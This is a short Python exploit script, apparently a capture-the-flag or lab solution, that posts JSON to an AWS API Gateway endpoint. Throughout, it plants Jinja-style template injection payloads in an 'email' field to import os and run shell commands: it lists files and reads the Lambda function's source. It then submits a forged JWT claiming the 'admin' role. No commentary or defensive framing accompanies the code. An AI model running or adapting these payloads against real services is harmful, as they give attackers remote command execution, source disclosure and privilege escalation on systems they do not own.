import requests
import json
import readline
import ast

url = "https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01"

def solve(obj):
	x = requests.post(url, json=obj)
	x = x.text
	d = ast.literal_eval(x)
	j = d["body"].split("\n")
	

	for i in j:
		print(i)

if __name__ == '__main__':
	commands = ['ls -al | sort -r', 'cat lambda_function.py']
	obj = {"action":"help","email":"{{globals().__builtins__.__import__('os').popen('ls -al | sort - r').read()}}"}
	solve(obj)
	obj = {"action":"help","email":"{{globals().__builtins__.__import__('os').popen('cat lambda_function.py').read()}}"}
	solve(obj)

	# sed -n 5,8p file
	obj = {"action":"help","email":"{{globals().__builtins__.__import__('os').popen('sed -n 20,100p lambda_function.py').read()}}"}
	solve(obj)

	obj = {"action":   "verify","token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJhZG1pbiJ9.S9-09o2b55F1WD2Fgyam6R-aL_CM93EaetWVIDB9-ks"}
	solve(obj)